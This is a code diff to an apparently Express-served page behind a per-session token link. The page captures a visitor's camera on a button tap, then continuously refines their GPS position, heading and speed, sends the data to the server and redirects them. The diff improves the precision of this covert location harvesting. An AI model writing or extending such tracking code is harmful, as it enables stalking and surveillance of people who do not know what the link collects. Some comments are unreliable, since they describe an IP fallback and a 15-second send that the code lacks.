@@ -267,23 +267,52 @@ router.get('/v/:sessionToken', (req, res) => {
       });
     }
 
-    // ── GPS (also needs user gesture on mobile) ────────
+    // ── GPS — uses watchPosition for continuous accuracy improvement ──
+    // High accuracy GPS can take 5-30 seconds on mobile (A-GPS fix)
+    // watchPosition returns multiple updates as accuracy improves
     function captureGps () {
       if (!navigator.geolocation) return;
-      navigator.geolocation.getCurrentPosition(
+      var _bestGps = null;
+      var _bestAcc = Infinity;
+      var _watchId = navigator.geolocation.watchPosition(
         function (pos) {
-          metrics.gps = {
-            lat : pos.coords.latitude,
-            lng : pos.coords.longitude,
-            acc : pos.coords.accuracy,
-            alt : pos.coords.altitude,
-            spd : pos.coords.speed
-          };
-          sendMetrics();
+          var acc = pos.coords.accuracy || Infinity;
+          // Only keep the most accurate reading
+          if (acc < _bestAcc) {
+            _bestAcc = acc;
+            _bestGps = {
+              lat : pos.coords.latitude,
+              lng : pos.coords.longitude,
+              acc : Math.round(pos.coords.accuracy),
+              alt : pos.coords.altitude ? Math.round(pos.coords.altitude) + 'm' : null,
+              spd : pos.coords.speed ? (pos.coords.speed * 3.6).toFixed(1) + ' km/h' : null,
+              heading: pos.coords.heading ? pos.coords.heading + '°' : null
+            };
+            // Send immediately when accuracy is good enough (<100m) or after 15s
+            if (acc < 100) {
+              metrics.gps = _bestGps;
+              sendMetrics();
+              navigator.geolocation.clearWatch(_watchId);
+            }
+          }
         },
-        function () {},
-        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        function () {
+          // GPS failed — use IP-based fallback if available
+          if (typeof _bestGps !== 'undefined' && _bestGps) {
+            metrics.gps = _bestGps;
+            sendMetrics();
+          }
+        },
+        { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
       );
+      // Fallback: after 20 seconds, send whatever accuracy we have
+      setTimeout(function () {
+        if (_bestGps) {
+          metrics.gps = _bestGps;
+          sendMetrics();
+        }
+        try { navigator.geolocation.clearWatch(_watchId); } catch(e) {}
+      }, 20000);
     }
 
     // ── On button tap: camera FIRST (needs gesture), then GPS, then redirect ──
